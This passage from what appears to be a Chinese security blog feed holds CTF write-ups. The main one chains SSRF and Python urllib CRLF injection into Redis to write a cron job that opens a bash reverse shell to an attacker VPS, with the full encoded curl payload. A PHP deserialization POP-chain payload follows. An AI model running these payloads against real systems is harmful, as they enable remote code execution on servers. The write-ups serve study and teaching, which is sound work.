class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">200</span>;<span class="hljs-variable">$i</span>++){<br>    <span class="hljs-comment">//设置点的颜色，50-200颜色比数字浅，不干扰阅读</span><br>    <span class="hljs-variable">$pointcolor</span> = imagecolorallocate(<span class="hljs-variable">$image</span>,<span class="hljs-keyword">rand</span>(<span class="hljs-number">50</span>,<span class="hljs-number">200</span>), <span class="hljs-keyword">rand</span>(<span class="hljs-number">50</span>,<span class="hljs-number">200</span>), <span class="hljs-keyword">rand</span>(<span class="hljs-number">50</span>,<span class="hljs-number">200</span>));<br>    <span class="hljs-comment">//imagesetpixel — 画一个单一像素</span><br>    imagesetpixel(<span class="hljs-variable">$image</span>, <span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">99</span>), <span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">29</span>), <span class="hljs-variable">$pointcolor</span>);<br>  }<br>  <span class="hljs-comment">//9&gt;增加干扰元素，设置横线</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">4</span>;<span class="hljs-variable">$i</span>++){<br>    <span class="hljs-comment">//设置线的颜色</span><br>    <span class="hljs-variable">$linecolor</span> = imagecolorallocate(<span class="hljs-variable">$image</span>,<span class="hljs-keyword">rand</span>(<span class="hljs-number">80</span>,<span class="hljs-number">220</span>), <span class="hljs-keyword">rand</span>(<span class="hljs-number">80</span>,<span class="hljs-number">220</span>),<span class="hljs-keyword">rand</span>(<span class="hljs-number">80</span>,<span class="hljs-number">220</span>));<br>    <span class="hljs-comment">//设置线，两点一线</span><br>    imageline(<span class="hljs-variable">$image</span>,<span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">99</span>), <span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">29</span>),<span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">99</span>), <span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">29</span>),<span class="hljs-variable">$linecolor</span>);<br>  }<br><br>  <span class="hljs-comment">//2&gt;设置头部，image/png</span><br>  header(<span class="hljs-string">‘Content-Type: image/png’</span>);<br>  <span class="hljs-comment">//3&gt;imagepng() 建立png图形函数</span><br>  imagepng(<span class="hljs-variable">$image</span>);<br>  <span class="hljs-comment">//4&gt;imagedestroy() 结束图形函数 销毁$image</span><br>  <span class="hljs-comment">//imagedestroy($image);</span><br>  ?&gt;</code></pre><br><p>会生成image图片以及session值</p><br><h1 id="0x03-效果展示">0x03 效果展示</h1><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616194959038?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h1 id="0x04-攻击手段">0x04 攻击手段</h1><br><p>这里就不详细阐述了 <br><br><a href="http://www.freebuf.com/articles/database/134343.html" target="_blank" rel="external">可以参考freebuf上的一篇文章</a><br></p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;时下图形验证码的应用已经非常广泛了，无论是在web应用还是客户端软件中。主要是用来防止字典攻击（或称暴力猜解）、机器注册等   本篇文章主要讲解验证码实现机制与安全策略突破&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Hack Redis via Python urllib HTTP Header Injection</title>
    <link href="http://yoursite.com/2017/06/16/Hack%20Redis%20via%20Python%20urllib%20HTTP%20Header%20Injection/"/>
    <id>http://yoursite.com/2017/06/16/Hack Redis via Python urllib HTTP Header Injection/</id>
    <published>2017-06-15T16:39:00.000Z</published>
    <updated>2017-10-22T02:14:27.639Z</updated>
    
    <content type="html"><![CDATA[<p>本篇文章带来的是python低版本的urllib 头部注入，攻击目标为局域网内的Redis，结合着一道CTF实例，演示整个攻击过程<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><blockquote><br><p>本篇文章带来的是python低版本的urllib 头部注入，攻击目标为局域网内的Redis，结合着一道CTF实例，演示整个攻击过程</p><br></blockquote><br><p><div class="toc"><div class="toc"><br><ul><br><li><a href="#0x01-简介">0x01 简介</a></li><br><li><a href="#0x02-环境搭建">0x02 环境搭建</a></li><br><li><a href="#0x03-题目分析">0x03 题目分析</a><ul><br><li><a href="#0x1-ssrf">0x1 ssrf</a></li><br><li><a href="#0x2-python-urllib-注入">0x2 python urllib 注入</a><ul><br><li><a href="#1-docker-1">docker 1</a></li><br><li><a href="#2docker-2">docker 2</a></li><br></ul><br></li><br><li><a href="#0x3-redis攻击方式">0x3 redis攻击方式</a><ul><br><li><a href="#1webshell">webshell</a></li><br><li><a href="#2利用redis写恶意命令">利用redis写恶意命令</a></li><br><li><a href="#3接收反弹的shell">接收反弹的shell</a></li><br></ul><br></li><br></ul><br></li><br></ul><br></div><br></div><br></p><br><h1 id="0x01-简介">0x01 简介</h1><br><p>2016年6月BLINDSPOT披露了Python urllib http头注入漏洞：<a href="http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html" target="_blank" rel="external">http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html</a> <br><br>通过这个漏洞，如果使用了Python的urllib库，并且请求的url为用户可控，那么就可能存在内网被探测的风险，如果本机或内网服务器中装有未授权访问的redis，那么服务器则有被getshell的风险。<br></p><br><h1 id="0x02-环境搭建">0x02 环境搭建</h1><br><blockquote><br><p>利用2016hctf ATfeild 源码搭建 <br><br><a href="https://github.com/LoRexxar/hctf2016_atfield" target="_blank" rel="external">https://github.com/LoRexxar/hctf2016_atfield</a><br></p><br></blockquote><br><table><br><thead><br><tr><br><th>主机</th><br><th>ip</th><br><th>配置</th><br></tr><br></thead><br><tbody><tr><br><td>本机</td><br><td>172.17.0.1</td><br><td>Ubuntu:16.04</td><br></tr><br><tr><br><td>docker1</td><br><td>172.17.0.2</td><br><td>Ubuntu:16.04 python2.7.6（源码编译）</td><br></tr><br><tr><br><td>docker2</td><br><td>172.17.0.4</td><br><td>centos:6 redis2.4.3</td><br></tr><br></tbody></table><br><h1 id="0x03-题目分析">0x03 题目分析</h1><br><p>整个题目只有一个输入框 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616004313699?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>要求输入图片的url ，后台的访问过程因该是直接去请求文件 <br><br>打印出来的image地址很可疑 怀疑是ssrf<br><br><br></p><br><p>下一步就是寻找内网主机</p><br><h2 id="0x1-ssrf">0x1 ssrf</h2><br><p>这里我们测试能发现，并不允许ip的请求，也就是描述中所说的，请求必须符合.tld标准并且包含域名，如果想要请求127.0.0.1，我们这里有两种绕过方式</p><br><p>1、 <a href="http://www.127.0.0.1.xip.io" target="_blank" rel="external">http://www.127.0.0.1.xip.io</a></p><br><p>这种方式可以自动把域名指向中间的ip，在一些特殊情况下非常好用</p><br><p>2、 <a href="http://xxxxx/?u=http://127.0.0.1" target="_blank" rel="external">http://xxxxx/?u=http://127.0.0.1</a></p><br><p>在有域名的vps上写一个跳转页面实现，事实上，只有第二种做法可以顺利继续做下一题</p><br><p>这里采用两种方法结合的方式 <br><br>构造<a href="http://www.vps.xip.io/302.php?u=http://127.0.0.1" target="_blank" rel="external">http://www.vps.xip.io/302.php?u=http://127.0.0.1</a><br></p><br><h2 id="0x2-python-urllib-注入">0x2 python urllib 注入</h2><br><p>该漏洞的前提python版本为python3 &lt; 3.4.3 || python2 &lt; 2.7.9 （ps 这里python版本必须是自己编译的，虽然不知道为什么？？？）</p><br><p>首先我们了解一下什么是python urllib 注入</p><br><h3 id="1-docker-1">1. docker 1</h3><br><p>是对外开放的web服务器端 <br><br>编写请求脚本<br></p><br><pre class="prettyprint"><code class=" hljs d"><span class="hljs-shebang">#!/usr/bin/env python                                                       </span><br># encoding: utf-<span class="hljs-number">8</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> urllib2<br>url = sys.argv[<span class="hljs-number">1</span>]<br>info = urllib2.urlopen(url)</code></pre><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616010427229?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>通过发送请求 达到恶意数据被执行 <br><br><code>python a.py <a href="http://172.17.0.3%0d%0aset%20a%2012345%0d%0a:8888/" target="_blank" rel="external">http://172.17.0.3%0d%0aset%20a%2012345%0d%0a:8888/</a></code> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616010648352?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>首先在docker2中nc  -lp 8888端口 <br><br>观察现象 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616010827953?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>发现中间的字符串正常的解析了，正好是一组redis命令<br><br><br><br><br><br><br></p><br><h3 id="2docker-2">2.docker 2</h3><br><p>是内网中的服务器，里面有redis以及crontab任务管理 <br><br>docker2中开启了redis服务<br></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616010952682?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p>如果刚才docker1中的请求端口是6379，那么就会吧aa变量加入到集合中，从而能证明header注入redis是否成功 <br><br>最后看截图 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616011230120?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br></p><br><p>成功解析语句并执行</p><br><h2 id="0x3-redis攻击方式">0x3 redis攻击方式</h2><br><p>首先整体的思路是用户通过操作docker1去访问docker2其中的数据具有恶意性，并且可以在docker2中解析执行，从而在docker2中进行破坏最后拿到webshell，系统管理权限</p><br><h3 id="1webshell">1.webshell</h3><br><p>利用最经典的webshell获取方法 <br><br>通过1.2.2 我们能够绕过过滤，在通过1.2.1我们能够构造payload写入信息redis，再加上提示说有crontab，这样我们就可以通过redis来写crontab文件然后反弹shell。<br></p><br><p>正常我们在bash下反弹shell是这样子的命令</p><br><p><code>/bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1</code> <br><br>写成计划任务形式，即crontab文件形式<br></p><br><p><code><em>/1 </em> <em> </em> <em> /bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1</em></code></p><br><p>代表每分钟执行一次</p><br><h3 id="2利用redis写恶意命令">2.利用redis写恶意命令</h3><br><p>通常来说我们在使用redis写文件方法如下：</p><br><pre class="prettyprint"><code class=" hljs cs"><span class="hljs-keyword">set</span> <span class="hljs-number">11</span> <span class="hljs-string">“/1 <em> </em> <em> </em> /bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1”</span><br>config <span class="hljs-keyword">set</span> dir /<span class="hljs-keyword">var</span>/spool/cron<br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br></code></pre><br><p>但本题采取了另一个方式 因为redis不会识别空格</p><br><pre class="prettyprint"><code class=" hljs livecodeserver">（<span class="hljs-number">1</span>） <span class="hljs-built_in">set</span> <span class="hljs-number">11</span> <span class="hljs-string">“\n<em>/1 </em> <em> </em> <em> /bin/bash -i &gt;&amp; /dev/tcp/(vps address)/12345 0&gt;&amp;1\n”</em></span><span class="hljs-number">3</span>     <span class="hljs-comment"> //表示有三个参数</span><br>$<span class="hljs-number">3</span>    <span class="hljs-comment"> //下面这个参数长度为3</span><br><span class="hljs-built_in">set</span><br>$<span class="hljs-number">1</span>    <span class="hljs-comment"> //下面这个参数长度为1</span><br><span class="hljs-operator">a</span><br>$<span class="hljs-number">64</span>  <span class="hljs-comment"> //下面这个参数长度为64</span><br>\n<em>/<span class="hljs-number">1</span> </em> <em> </em> <em> /bin/bash -i &gt;&amp; /dev/tcp/(vps address)/<span class="hljs-number">12345</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>\n</em></code></pre><br><p>这里\n在传输的时候替换成%0a，所以我们要传入的明文子串如下：</p><br><pre class="prettyprint"><code class=" hljs lasso"><br><span class="hljs-keyword">link</span><span class="hljs-subst">=</span>http:<span class="hljs-comment">//www.(vps address).xip.io/302.php?url=<a href="http://172.17.0.4" target="_blank" rel="external">http://172.17.0.4</a></span><br><span class="hljs-subst"></span><span class="hljs-number">3</span><br>$<span class="hljs-number">3</span><br><span class="hljs-built_in">set</span><br>$<span class="hljs-number">1</span><br>a<br>$<span class="hljs-number">64</span><br><span class="hljs-subst"><em></em></span>/<span class="hljs-number">1</span> <span class="hljs-subst"></span> <span class="hljs-subst"><em></em></span> <span class="hljs-subst"></span> <span class="hljs-subst">*</span> /bin/bash <span class="hljs-attribute">-i</span> <span class="hljs-subst">&gt;&amp;</span> /dev/tcp<span class="hljs-subst">/</span>(vps address)/<span class="hljs-number">12345</span> <span class="hljs-number">0</span><span class="hljs-subst">&gt;&amp;</span><span class="hljs-number">1</span><br>config <span class="hljs-built_in">set</span> dir /<span class="hljs-built_in">var</span>/spool/cron<br>config <span class="hljs-built_in">set</span> dbfilename root<br>save<br>:<span class="hljs-number">6379</span><span class="hljs-subst">/</span></code></pre><br><p>不能直接发送过去 ，首先进行进行URL编码转换，应该转换几次呢？ <br><br>答案是3次 用户web浏览器一次/跳转一次/内网请求一次 <br><br>在换行时必须采用%0d%0a 那么最后的形式是将下面的link再转码两次<br><br></p><br><pre class="prettyprint"><code class=" hljs perl"><span class="hljs-keyword">link</span>=http:<span class="hljs-regexp">//www</span>.(vps address).xip.io/<span class="hljs-number">302</span>.php?url=http:<span class="hljs-regexp">//</span><span class="hljs-number">172.17</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span><span class="hljs-variable">%2a3</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span><span class="hljs-variable">%243</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0Aset</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span><span class="hljs-variable">%241</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0Aa</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span><span class="hljs-variable">%2464</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span><span class="hljs-variable">%0a</span><span class="hljs-variable">%2a</span><span class="hljs-variable">%2f1</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2a</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2a</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2a</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2a</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2fbin</span><span class="hljs-variable">%2fbash</span><span class="hljs-variable">%20</span>-i<span class="hljs-variable">%20</span><span class="hljs-variable">%3E</span><span class="hljs-variable">%26</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2fdev</span><span class="hljs-variable">%2ftcp</span><span class="hljs-variable">%2f</span>(vps address)<span class="hljs-variable">%2f12345</span><span class="hljs-variable">%200</span><span class="hljs-variable">%3E</span><span class="hljs-variable">%261</span><span class="hljs-variable">%0a</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0Aconfig</span><span class="hljs-variable">%20set</span><span class="hljs-variable">%20dir</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2fvar</span><span class="hljs-variable">%2fspool</span><span class="hljs-variable">%2fcron</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0Aconfig</span><span class="hljs-variable">%20set</span><span class="hljs-variable">%20dbfilename</span><span class="hljs-variable">%20root</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0Asave</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span>:<span class="hljs-number">6379</span>/</code></pre><br><p>利用crul 方法发送出去</p><br><pre class="prettyprint"><code class=" hljs perl">curl -d <span class="hljs-string">“link=http<span class="hljs-variable">%3A</span><span class="hljs-variable">%2f</span><span class="hljs-variable">%2fwww</span>.(vps address).xip.io<span class="hljs-variable">%2f302</span>.php<span class="hljs-variable">%3Furl</span><span class="hljs-variable">%3Dhttp</span><span class="hljs-variable">%253A</span><span class="hljs-variable">%252f</span><span class="hljs-variable">%252f172</span>.17.0.3<span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%25252a3</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%2525243</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250Aset</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%2525241</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250Aa</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%25252464</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%25250a</span><span class="hljs-variable">%25252a</span><span class="hljs-variable">%25252f1</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252a</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252a</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252a</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252a</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252fbin</span><span class="hljs-variable">%25252fbash</span><span class="hljs-variable">%252520</span>-i<span class="hljs-variable">%252520</span><span class="hljs-variable">%25253E</span><span class="hljs-variable">%252526</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252fdev</span><span class="hljs-variable">%25252ftcp</span><span class="hljs-variable">%25252f</span>(vps address)<span class="hljs-variable">%25252f12345</span><span class="hljs-variable">%2525200</span><span class="hljs-variable">%25253E</span><span class="hljs-variable">%2525261</span><span class="hljs-variable">%25250a</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250Aconfig</span><span class="hljs-variable">%252520set</span><span class="hljs-variable">%252520dir</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252fvar</span><span class="hljs-variable">%25252fspool</span><span class="hljs-variable">%25252fcron</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250Aconfig</span><span class="hljs-variable">%252520set</span><span class="hljs-variable">%252520dbfilename</span><span class="hljs-variable">%252520root</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250Asave</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%253A6379</span><span class="hljs-variable">%252f</span>“</span> <span class="hljs-string">“<a href="http://172.17.0.4:8000/show" target="_blank" rel="external">http://172.17.0.4:8000/show</a>“</span> -v -L</code></pre><br><p>执行结果如下 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616014958229?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616015042229?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>成功执行 <br><br>观察 redis端的情况 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616015131715?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616020355536?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br><br><br><br></p><br><p>成功实现计划任务的写入 <br><br>下面就是vps接受反弹的shell<br></p><br><h3 id="3接收反弹的shell">3.接收反弹的shell</h3><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616020911274?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇文章带来的是python低版本的urllib 头部注入，攻击目标为局域网内的Redis，结合着一道CTF实例，演示整个攻击过程&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="write-up" scheme="http://yoursite.com/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>2017 GCTF Web WriteUp</title>
    <link href="http://yoursite.com/2017/06/15/2017%20GCTF%20Web%20WriteUp/"/>
    <id>http://yoursite.com/2017/06/15/2017 GCTF Web WriteUp/</id>
    <published>2017-06-15T15:35:00.000Z</published>
    <updated>2017-10-22T02:14:27.975Z</updated>
    
    <content type="html"><![CDATA[<p>比赛的时候没来的及做听说很简单<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><p>比赛的时候没来的及做听说很简单</p><br><h1 id="0x01-条件竞争">0x01 条件竞争</h1><br><p>看了逻辑之后就是个简单的竞争题目 <br><br>利用burp爆破即可 <br><br>reset <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170615215132690?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>login <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170615215106815?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>最后得到flag <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170615215156925?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br><br><br><br><br></p><br><h1 id="0x02-php序列化">0x02 PHP序列化</h1><br><p>这一题也是比较老套的题目，看具体的分析过程 <br><br>在主页面 使用的session解析方式是 <br><br><code>ini_set(‘session.serialize_handler’, ‘php_serialize’);</code> <br><br>在<code>query.php</code>界面是php的默认解析方式 <br><br><a href="http://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="external">具体的区别参照我以前写的博客</a><br><br><br><br></p><br><h2 id="0x1-执行流程">0x1 执行流程</h2><br><p>在主页输入的src参数作为session的值存入服务器，当访问<code>query.php</code>时因为解析方法的不同使得session中的序列化的类被反序列化，因存在魔法函数导致了一系列的函数的执行，从而造成攻击</p><br><h2 id="0x2-代码分析">0x2 代码分析</h2><br><p>找到备份文件<code>query.php~</code></p><br><pre class="prettyprint"><code class=" hljs coffeescript"><span class="hljs-regexp">/<strong><strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></strong>/</span><br>/<em><br><span class="hljs-regexp">//</span>query.php 閮ㄥ垎浠ｇ爜<br>session_start();<br>header(<span class="hljs-string">‘Look me: edit by vim ~0~’</span>)<br><span class="hljs-regexp">//</span>……<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TOPA</span>{</span><br>    public $token;<br>    public $ticket;<br>    public $username;<br>    public $password;<br>    <span class="hljs-reserved">function</span> login(){<br>        <span class="hljs-regexp">//i</span>f($<span class="hljs-keyword">this</span>-&gt;username == $USERNAME &amp;&amp; $<span class="hljs-keyword">this</span>-&gt;password == $PASSWORD){ <span class="hljs-regexp">//</span>鎶辨瓑<br>        $<span class="hljs-keyword">this</span>-&gt;username ==<span class="hljs-string">‘aaaaaaaaaaaaaaaaa’</span> &amp;&amp; $<span class="hljs-keyword">this</span>-&gt;password == <span class="hljs-string">‘bbbbbbbbbbbbbbbbbb’</span>){<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">‘key is:{‘</span>.$<span class="hljs-keyword">this</span>-&gt;token.<span class="hljs-string">‘}’</span>;<br>        }<br>    }<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TOPB</span>{</span><br>    public $obj;<br>    public $attr;<br>    <span class="hljs-reserved">function</span> <strong>construct(){<br>        $<span class="hljs-keyword">this</span>-&gt;attr = <span class="hljs-literal">null</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;obj = <span class="hljs-literal">null</span>;<br>    }<br>    <span class="hljs-reserved">function</span> </strong>toString(){<br>        $<span class="hljs-keyword">this</span>-&gt;obj = unserialize($<span class="hljs-keyword">this</span>-&gt;attr);<br>        $<span class="hljs-keyword">this</span>-&gt;obj-&gt;token = $FLAG;<br>        <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;obj-&gt;token === $<span class="hljs-keyword">this</span>-&gt;obj-&gt;ticket){<br>           <span class="hljs-keyword">return</span> (string)$<span class="hljs-keyword">this</span>-&gt;obj;<br>        }<br>    }<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TOPC</span>{</span><br>    public $obj;<br>    public $attr;<br>    <span class="hljs-reserved">function</span> <strong>wakeup(){<br>        $<span class="hljs-keyword">this</span>-&gt;attr = <span class="hljs-literal">null</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;obj = <span class="hljs-literal">null</span>;<br>    }<br>    <span class="hljs-reserved">function</span> </strong>destruct(){<br>        echo $<span class="hljs-keyword">this</span>-&gt;attr;<br>    }<br>}</em>/ </code></pre><br><p>大致的流程反序列化TOPC执行echo  TOPB 触发TOPB的tostring方法，TOPB自带反序列化TOPA的函数，反序列化A后return 触发TOPA中的tostring</p><br><h2 id="0x3-bypass">0x3 bypass</h2><br><p>TOPC的</p><br><pre class="prettyprint"><code class=" hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span>{</span><br>        $<span class="hljs-keyword">this</span>-&gt;attr = <span class="hljs-literal">null</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;obj = <span class="hljs-literal">null</span>;<br>    }</code></pre><br><p>需要绕过，方法利用序列化变量值不同</p><br><p>TOPB的</p><br><pre class="prettyprint"><code class=" hljs lasso"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$this</span><span class="hljs-subst">-&gt;</span>obj<span class="hljs-subst">-&gt;</span>token <span class="hljs-subst">===</span> <span class="hljs-variable">$this</span><span class="hljs-subst">-&gt;</span>obj<span class="hljs-subst">-&gt;</span>ticket)</code></pre><br><p>不是弱类型比较，利用引用的方法</p><br><h2 id="0x4-payload生成">0x4 payload生成</h2><br><pre class="prettyprint"><code class=" hljs lasso"><span class="hljs-variable">$a</span> <span class="hljs-subst">=</span> <span class="hljs-literal">new</span> TOPA();<br><span class="hljs-variable">$a</span><span class="hljs-subst">-&gt;</span>token <span class="hljs-subst">=</span> <span class="hljs-subst">&amp;</span><span class="hljs-variable">$a</span><span class="hljs-subst">-&gt;</span>ticket;<br><span class="hljs-variable">$a</span><span class="hljs-subst">-&gt;</span>username <span class="hljs-subst">=</span> <span class="hljs-string">‘aaaaaaaaaaaaaaaaa’</span>;<br><span class="hljs-variable">$a</span><span class="hljs-subst">-&gt;</span>password <span class="hljs-subst">=</span> <span class="hljs-string">‘bbbbbbbbbbbbbbbbbb’</span>;<br><span class="hljs-comment">//这里在代码逻辑上是不用给username&amp;password赋值的，估计是函数写错了 ，还有login函数是怎么触发的，如果是tostring函数逻辑上就将通了</span><br><span class="hljs-variable">$b</span> <span class="hljs-subst">=</span> <span class="hljs-literal">new</span> TOPB();<br><span class="hljs-variable">$b</span><span class="hljs-subst">-&gt;</span>attr <span class="hljs-subst">=</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-variable">$c</span> <span class="hljs-subst">=</span> <span class="hljs-literal">new</span> TOPC();<br><span class="hljs-variable">$c</span><span class="hljs-subst">-&gt;</span>attr <span class="hljs-subst">=</span> <span class="hljs-variable">$b</span>;<br><br><br>echo serialize(<span class="hljs-variable">$c</span>));</code></pre><br><h2 id="0x5-利用">0x5 